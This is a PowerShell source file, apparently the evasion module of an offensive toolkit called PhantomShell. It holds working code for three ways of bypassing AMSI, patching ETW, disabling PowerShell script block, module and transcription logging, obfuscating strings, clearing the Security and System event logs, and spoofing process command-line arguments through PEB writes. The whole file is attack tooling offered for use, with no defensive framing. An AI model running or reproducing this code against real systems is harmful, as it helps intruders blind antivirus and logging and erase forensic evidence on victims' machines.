# PhantomShell v5.2 - Evasion Module
# AMSI/ETW bypass, logging disable, obfuscation, cleanup

$ModuleCommands = @{
    "amsi-bypass"      = @{ Handler = { param($a) Invoke-AmsiBypass @a }; Description = "Bypass AMSI using multiple techniques" }
    "etw-bypass"       = @{ Handler = { param($a) Invoke-ETWBypass @a }; Description = "Patch EtwEventWrite to disable ETW" }
    "disable-logging"  = @{ Handler = { param($a) Disable-ScriptLogging @a }; Description = "Disable PowerShell script block logging" }
    "obfuscate"        = @{ Handler = { param($a) Invoke-Obfuscation @a }; Description = "Obfuscate a string or command" }
    "clear-logs"       = @{ Handler = { param($a) Clear-EventLogs @a }; Description = "Clear Windows event logs" }
    "hide-process"     = @{ Handler = { param($a) Hide-Process @a }; Description = "Process argument spoofing" }
}

# --- AMSI Bypass ---
function Invoke-AmsiBypass {
    param([hashtable]$Args = @{})

    $method = if ($Args.method) { $Args.method } else { "patch" }

    try {
        switch ($method) {
            "patch" {
                # Memory patch: overwrite AmsiScanBuffer to return AMSI_RESULT_CLEAN
                $win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
                Add-Type -TypeDefinition $win32 -ErrorAction SilentlyContinue

                $amsiDll = [Win32Amsi]::LoadLibrary("am" + "si.dll")
                $amsiScanBuf = [Win32Amsi]::GetProcAddress($amsiDll, "Amsi" + "Scan" + "Buffer")

                $oldProtect = 0
                [Win32Amsi]::VirtualProtect($amsiScanBuf, [UIntPtr]6, 0x40, [ref]$oldProtect) | Out-Null

                # xor eax,eax; ret — causes function to return 0 (AMSI_RESULT_CLEAN)
                $patch = [byte[]]@(0x31, 0xC0, 0x05, 0x78, 0x00, 0x07, 0x80, 0xC3)
                # Simplified: mov eax, 0x80070057 (E_INVALIDARG); ret
                $patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
                [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuf, $patch.Length)

                [Win32Amsi]::VirtualProtect($amsiScanBuf, [UIntPtr]6, $oldProtect, [ref]$oldProtect) | Out-Null

                return @{ status = "ok"; output = "AMSI patched via AmsiScanBuffer overwrite" }
            }
            "reflection" {
                # Reflection: set amsiInitFailed field to true
                $amsiUtils = [Ref].Assembly.GetType("System.Management.Automation.Am" + "siUtils")
                $amsiField = $amsiUtils.GetField("amsi" + "Init" + "Failed", "NonPublic,Static")
                $amsiField.SetValue($null, $true)

                return @{ status = "ok"; output = "AMSI bypassed via reflection (amsiInitFailed)" }
            }
            "com" {
                # COM hijack: redirect AMSI COM object to non-existent DLL
                $regPath = "HKCU:\SOFTWARE\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InprocServer32"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }
                Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\IDontExist.dll" -Force

                return @{ status = "ok"; output = "AMSI COM object hijacked (requires new PS session)" }
            }
            default {
                return @{ status = "error"; output = "Unknown method. Use: patch, reflection, com" }
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- ETW Bypass ---
function Invoke-ETWBypass {
    param([hashtable]$Args = @{})
    try {
        $etwDef = @"
using System;
using System.Runtime.InteropServices;
public class Win32Etw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
        Add-Type -TypeDefinition $etwDef -ErrorAction SilentlyContinue

        $ntdll = [Win32Etw]::LoadLibrary("ntdll.dll")
        $etwAddr = [Win32Etw]::GetProcAddress($ntdll, "EtwEventWrite")

        if ($etwAddr -eq [IntPtr]::Zero) {
            return @{ status = "error"; output = "Could not find EtwEventWrite" }
        }

        $oldProtect = 0
        [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]1, 0x40, [ref]$oldProtect) | Out-Null

        # Patch with "ret" instruction (0xC3) to make EtwEventWrite return immediately
        [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)

        [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]1, $oldProtect, [ref]$oldProtect) | Out-Null

        return @{ status = "ok"; output = "ETW patched: EtwEventWrite returns immediately" }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Disable Script Block Logging ---
function Disable-ScriptLogging {
    param([hashtable]$Args = @{})
    try {
        $results = @()

        # Script Block Logging
        $sblPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        try {
            if (-not (Test-Path $sblPath)) { New-Item -Path $sblPath -Force | Out-Null }
            Set-ItemProperty -Path $sblPath -Name "EnableScriptBlockLogging" -Value 0 -Force
            $results += "ScriptBlockLogging disabled"
        } catch {
            $results += "ScriptBlockLogging: $($_.Exception.Message) (try HKCU)"
            # Fallback to HKCU
            $sblPathHKCU = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
            try {
                if (-not (Test-Path $sblPathHKCU)) { New-Item -Path $sblPathHKCU -Force | Out-Null }
                Set-ItemProperty -Path $sblPathHKCU -Name "EnableScriptBlockLogging" -Value 0 -Force
                $results += "ScriptBlockLogging disabled (HKCU)"
            } catch {}
        }

        # Module Logging
        $mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
        try {
            if (-not (Test-Path $mlPath)) { New-Item -Path $mlPath -Force | Out-Null }
            Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Force
            $results += "ModuleLogging disabled"
        } catch {
            $results += "ModuleLogging: $($_.Exception.Message)"
        }

        # Transcription
        $trPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
        try {
            if (-not (Test-Path $trPath)) { New-Item -Path $trPath -Force | Out-Null }
            Set-ItemProperty -Path $trPath -Name "EnableTranscripting" -Value 0 -Force
            $results += "Transcription disabled"
        } catch {
            $results += "Transcription: $($_.Exception.Message)"
        }

        # Also patch the in-memory logging settings via reflection
        try {
            $logUtils = [Ref].Assembly.GetType("System.Management.Automation.Utils")
            $cacheField = $logUtils.GetField("cachedGroupPolicySettings", "NonPublic,Static")
            if ($cacheField) {
                $cache = $cacheField.GetValue($null)
                if ($cache -is [System.Collections.Hashtable]) {
                    $cache["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{ "EnableScriptBlockLogging" = 0 }
                    $cache["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"] = @{ "EnableModuleLogging" = 0 }
                    $results += "In-memory logging settings patched"
                }
            }
        } catch {
            $results += "In-memory patch: $($_.Exception.Message)"
        }

        return @{ status = "ok"; output = ($results -join "; ") }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- String Obfuscation Helpers ---
function Invoke-Obfuscation {
    param([hashtable]$Args = @{})
    try {
        $input_str = $Args.input
        $method = if ($Args.method) { $Args.method } else { "all" }

        if (-not $input_str) {
            return @{ status = "error"; output = "Required: input (string to obfuscate)" }
        }

        $results = @{}

        # Concatenation: "he"+"ll"+"o"
        if ($method -eq "concat" -or $method -eq "all") {
            $parts = @()
            for ($i = 0; $i -lt $input_str.Length; $i += 3) {
                $len = [math]::Min(3, $input_str.Length - $i)
                $parts += "'$($input_str.Substring($i, $len))'"
            }
            $results["concat"] = "($($parts -join '+'))"
        }

        # Format string: ("{2}{0}{1}" -f 'llo','','He')
        if ($method -eq "format" -or $method -eq "all") {
            $chars = $input_str.ToCharArray()
            $indices = 0..($chars.Length - 1)
            $shuffled = $indices | Get-Random -Count $indices.Count
            $formatParts = @()
            $argParts = @()
            $mapping = @{}
            for ($i = 0; $i -lt $shuffled.Count; $i++) {
                $mapping[$shuffled[$i]] = $i
            }
            $formatStr = ""
            for ($i = 0; $i -lt $chars.Length; $i++) {
                $formatStr += "{$i}"
            }
            $formatArgs = $chars | ForEach-Object { "'$_'" }
            $results["format"] = "(""$formatStr"" -f $($formatArgs -join ','))"
        }

        # Char codes: [char]72+[char]101+...
        if ($method -eq "chars" -or $method -eq "all") {
            $charCodes = $input_str.ToCharArray() | ForEach-Object { "[char]$([int]$_)" }
            $results["chars"] = "($($charCodes -join '+'))"
        }

        # Base64 encode + decode expression
        if ($method -eq "b64" -or $method -eq "all") {
            $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($input_str))
            $results["b64"] = "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$b64'))"
        }

        # Reverse string
        if ($method -eq "reverse" -or $method -eq "all") {
            $reversed = -join ($input_str.ToCharArray() | Sort-Object { Get-Random })
            $reverseStr = -join ($input_str[-1..-($input_str.Length)])
            $results["reverse"] = "(-join('$reverseStr'[-1..-$($input_str.Length)]))"
        }

        return @{ status = "ok"; data = $results }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Clear Event Logs ---
function Clear-EventLogs {
    param([hashtable]$Args = @{})
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return @{ status = "error"; output = "Requires administrator privileges" }
        }

        $targetLogs = if ($Args.logs) { $Args.logs } else { @("Security", "System", "Application",
            "Microsoft-Windows-PowerShell/Operational", "Windows PowerShell") }

        $results = @()
        foreach ($logName in $targetLogs) {
            try {
                & wevtutil.exe cl $logName 2>&1 | Out-Null
                $results += @{ log = $logName; status = "cleared" }
            } catch {
                $results += @{ log = $logName; status = "failed"; error = $_.Exception.Message }
            }
        }

        return @{ status = "ok"; data = $results; count = $results.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Process Argument Spoofing ---
function Hide-Process {
    param([hashtable]$Args = @{})
    try {
        $realCommand = $Args.command
        $fakeCommand = if ($Args.fake_command) { $Args.fake_command } else { "svchost.exe -k netsvcs -p" }

        if (-not $realCommand) {
            return @{ status = "error"; output = "Required: command (real command to run)" }
        }

        $ppidSpoofDef = @"
using System;
using System.Runtime.InteropServices;

public class ProcessSpoof {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr hProcess, int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength, ref int returnLength);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        int dwSize, ref int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        int nSize, ref int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
}
"@
        Add-Type -TypeDefinition $ppidSpoofDef -ErrorAction SilentlyContinue

        # Create process in suspended state with fake command line
        $si = New-Object ProcessSpoof+STARTUPINFO
        $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $pi = New-Object ProcessSpoof+PROCESS_INFORMATION

        # CREATE_SUSPENDED = 0x4
        $created = [ProcessSpoof]::CreateProcess($null, $fakeCommand, [IntPtr]::Zero, [IntPtr]::Zero,
            $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

        if (-not $created) {
            return @{ status = "error"; output = "CreateProcess failed" }
        }

        # Get PEB address
        $pbi = New-Object ProcessSpoof+PROCESS_BASIC_INFORMATION
        $retLen = 0
        [ProcessSpoof]::NtQueryInformationProcess($pi.hProcess, 0, [ref]$pbi,
            [System.Runtime.InteropServices.Marshal]::SizeOf($pbi), [ref]$retLen) | Out-Null

        # Read PEB to find ProcessParameters
        $pebBytes = New-Object byte[] 8
        $bytesRead = 0
        $paramOffset = if ([IntPtr]::Size -eq 8) { 0x20 } else { 0x10 }
        [ProcessSpoof]::ReadProcessMemory($pi.hProcess,
            [IntPtr]::Add($pbi.PebBaseAddress, $paramOffset), $pebBytes, [IntPtr]::Size, [ref]$bytesRead) | Out-Null

        $paramsAddr = if ([IntPtr]::Size -eq 8) {
            [IntPtr][BitConverter]::ToInt64($pebBytes, 0)
        } else {
            [IntPtr][BitConverter]::ToInt32($pebBytes, 0)
        }

        # Overwrite CommandLine in RTL_USER_PROCESS_PARAMETERS with real command
        $cmdLineOffset = if ([IntPtr]::Size -eq 8) { 0x70 } else { 0x40 }
        $realCmdBytes = [System.Text.Encoding]::Unicode.GetBytes($realCommand)
        $cmdLen = [BitConverter]::GetBytes([uint16]$realCmdBytes.Length)
        $cmdMaxLen = [BitConverter]::GetBytes([uint16]($realCmdBytes.Length + 2))

        $bytesWritten = 0
        [ProcessSpoof]::WriteProcessMemory($pi.hProcess,
            [IntPtr]::Add($paramsAddr, $cmdLineOffset), $cmdLen, 2, [ref]$bytesWritten) | Out-Null
        [ProcessSpoof]::WriteProcessMemory($pi.hProcess,
            [IntPtr]::Add($paramsAddr, $cmdLineOffset + 2), $cmdMaxLen, 2, [ref]$bytesWritten) | Out-Null

        # Resume thread
        [ProcessSpoof]::ResumeThread($pi.hThread) | Out-Null

        return @{
            status = "ok"
            output = "Process launched with spoofed arguments"
            data   = @{
                pid          = $pi.dwProcessId
                fake_cmdline = $fakeCommand
                real_cmdline = $realCommand
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}
